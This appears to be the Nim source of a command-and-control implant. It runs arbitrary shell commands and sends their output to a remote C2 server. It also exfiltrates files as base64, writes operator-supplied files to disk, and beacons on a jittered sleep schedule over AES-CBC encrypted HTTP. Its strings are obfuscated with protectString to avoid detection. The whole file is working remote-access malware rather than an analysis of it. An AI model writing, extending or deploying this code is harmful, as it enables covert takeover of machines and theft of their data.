import config
import std/[strformat, tables, nativesockets, streams, random, json, base64, encodings]
import system/[io]
import httpclient
import nimprotect
import nimcrypto
import strutils
import osproc


# Core functions
proc post_data*(client: HttpClient, command_type: string, data_dict: string): bool

# Command executors
proc run_shell_command*(client: HttpClient, shell_command: string): bool
proc exfil_file*(client: HttpClient, file_path: string): bool
proc write_file*(client: HttpClient, file_data_base64: string, file_path: string): bool
proc change_sleep_time*(client: HttpClient, timeframe: int,  jitter_percent: int): bool
proc die*(client: HttpClient): void

# Encryption & Encoding
proc encrypt_cbc*(plain_text: string, key: string, iv: string): string
proc decrypt_cbc*(cipher_text: string, key: string, iv: string): string
proc encode_64*(text: string,  is_bin: bool = false, encoding: string = "UTF-16"): string
proc decode_64*(encoded_text: string, is_bin: bool = false, encoding: string = "UTF-16"): string 

# Helpers
proc calc_sleep_time*(timeframe: int,  jitter_percent: int): int

# Globals
let c2_url = fmt"{c2_scheme}://{c2_address}:{c2_port}"


proc post_data*(client: HttpClient, command_type: string, data_dict: string): bool =
    var data_to_send = protectString("""{"command_type": """") & command_type & protectString("""", "data": """) & data_dict & "}"
    try:
        discard client.post(c2_url, body=encrypt_cbc(data_to_send, communication_aes_key, communication_aes_iv))
        return true
    except:
        return false


proc run_shell_command*(client: HttpClient, shell_command: string): bool =
    var output: string
    var retval: int
    var is_success = true

    (output, retval) = execCmdEx(shell_command, options={poDaemon})
    
    if retval != 0:
        output = protectString("Error: shell return value = ") & $retval 
        is_success = false 

    var data = {
        protectString("shell_command"): shell_command,
        protectString("is_success"): $is_success,
        protectString("output"): "\n" & output
    }.toOrderedTable()
    
    is_success = post_data(client, protectString("cmd"), $data)
    
    return is_success


proc exfil_file*(client: HttpClient, file_path: string): bool = 
    var is_success: bool
    var file_content_base64: string

    try:
        file_content_base64 = encode_64(readFile(file_path), is_bin=true)
        is_success = true
    except:
        file_content_base64 = could_not_retrieve
        is_success = false
    
    var data = {
        protectString("is_success"): $is_success,
        protectString("file_path"): file_path,
        protectString("file_content_base64"): file_content_base64
    }.toOrderedTable()
    
    is_success = post_data(client, protectString("download") , $data)

    return is_success


proc write_file*(client: HttpClient, file_data_base64: string, file_path: string): bool =
    var is_success: bool
    var f = newFileStream(file_path, fmWrite)
    
    if isNil(f):
        is_success = false
    else:
        var file_data = decode_64(file_data_base64, is_bin=true)
        f.write(file_data)
        f.close()
        is_success = true
    
    var data = {
        protectString("is_success"): $is_success,
        protectString("file_upload_path"): file_path,
    }.toOrderedTable()
    
    is_success = post_data(client, protectString("upload") , $data)

    return is_success


proc change_sleep_time*(client: HttpClient, timeframe: int,  jitter_percent: int): bool =
    var is_success: bool
    call_home_timeframe = timeframe
    call_home_jitter_percent = jitter_percent
    
    var data = {
        protectString("sleep_timeframe"): $call_home_timeframe,
        protectString("sleep_jitter_percent"): $call_home_jitter_percent
    }.toOrderedTable()
    
    is_success = post_data(client, protectString("sleep") , $data)
    return is_success


proc die*(client: HttpClient): void =
    
    discard post_data(client, protectString("die") , protectString("""{"Good bye": ":("}"""))
    quit()


proc encrypt_cbc*(plain_text: string, key: string, iv: string): string =    
    var ectx: CBC[aes256]
    var cipher_text_block = newString(aes256.sizeBlock * 2)
    var cipher_text: string
    var plain_text_block: string
    var plain_text_padded = plain_text
    var a = 0
    var b = aes256.sizeBlock * 2 - 1
    
    # padding
    while len(plain_text_padded) mod 32 != 0:
        plain_text_padded = plain_text_padded & " "
    
    # init encryption context
    ectx.init(key, iv)
    
    # encrypt 32-bit blocks
    while b < len(plain_text_padded):
        plain_text_block = plain_text_padded.substr(a, b)
        ectx.encrypt(plain_text_block, cipher_text_block)
        cipher_text.add(cipher_text_block)
        a += aes256.sizeBlock * 2
        b += aes256.sizeBlock * 2

    # clear encryption context
    ectx.clear()
    
    return cipher_text


proc decrypt_cbc*(cipher_text: string, key: string, iv: string): string =
    var dctx: CBC[aes256]
    var plain_text_block = newString(aes256.sizeBlock * 2)
    var plain_text: string
    var cipher_text_block: string
    var a = 0
    var b = aes256.sizeBlock * 2 - 1
    
    # init encryption context
    dctx.init(key, iv)

    # decrypt 32-bit blocks
    while b < len(cipher_text):
        cipher_text_block = cipher_text.substr(a, b)
        dctx.decrypt(cipher_text_block, plain_text_block)
        plain_text.add(plain_text_block)
        a += aes256.sizeBlock * 2
        b += aes256.sizeBlock * 2
    
    # clear encryption context
    dctx.clear()
    
    # remove padding
    while plain_text.endsWith(" "):
        plain_text.removeSuffix(" ")

    return plain_text


proc encode_64*(text: string,  is_bin: bool = false, encoding: string = "UTF-16"): string =
    var text_to_encode: string
    if is_bin:
        text_to_encode = text
    else:
        text_to_encode = convert(text, encoding, getCurrentEncoding())
    var encoded_text = encode(text_to_encode)
    return encoded_text


proc decode_64*(encoded_text: string, is_bin: bool = false, encoding: string = "UTF-16"): string =
    var text = decode(encoded_text)
    if is_bin:
        return text
    else:
        var right_encoding = convert(text, "UTF-8", encoding)
        return right_encoding


proc calc_sleep_time*(timeframe: int,  jitter_percent: int): int =
    var jitter_range = ((jitter_percent * timeframe) / 100)
    var jitter_random = rand(((jitter_range / 2) * -1)..(jitter_range / 2))
    return (timeframe + int(jitter_random)) * 1000


